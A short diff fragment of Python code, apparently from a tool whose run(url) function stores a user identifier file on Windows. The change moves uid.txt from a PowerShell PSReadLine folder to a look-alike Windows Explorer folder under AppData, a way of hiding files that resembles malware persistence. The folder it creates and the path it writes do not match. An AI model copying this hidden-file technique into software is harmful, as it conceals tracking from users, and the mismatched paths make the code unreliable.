@@ -13,11 +13,11 @@ def run(url):
     def get_uid():
         if platform.system() == "Windows":
             user = getpass.getuser()
-            windows_path=f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Powershell\\PSReadLine\\uid.txt"
+            windows_path=f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\uid.txt"
 
-            if not os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Powershell\\PSReadLine"):
+            if not os.path.exists(f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\PSReadLine"):
                 # Create the folder
-                os.makedirs(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Powershell\\PSReadLine")
+                os.makedirs(f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\PSReadLine")
                 
             if os.path.exists(windows_path):
                 with open(windows_path,"r",) as f:
